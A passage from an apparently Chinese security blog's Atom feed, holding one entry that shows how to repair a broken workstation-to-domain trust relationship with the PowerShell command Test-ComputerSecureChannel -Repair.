    <category term="Web安全" scheme="http://example.com/category/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="工具使用" scheme="http://example.com/tag/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>域内问题解决总结</title>
    <link href="http://example.com/posts/2591890206.html"/>
    <id>http://example.com/posts/2591890206.html</id>
    <published>2023-12-27T06:39:42.000Z</published>
    <updated>2024-03-03T14:41:46.127Z</updated>
    
    <content type="html"><![CDATA[<h1 id="工作站和主域间的信任关系失败"><a href="#工作站和主域间的信任关系失败" class="headerlink" title="工作站和主域间的信任关系失败"></a>工作站和主域间的信任关系失败</h1><p>CMD打开powershell</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Test-ComputerSecureChannel</span> <span class="literal">-Credential</span> hack\Administrator <span class="literal">-Repair</span></span><br></pre></td></tr></table></figure><p>输入用户名密码</p><p>结果为True成功</p>]]></content>
    
    
    <summary type="html">域内问题解决总结</summary>
    
    
    
    <category term="内网安全" scheme="http://example.com/category/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="内网安全" scheme="http://example.com/tag/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
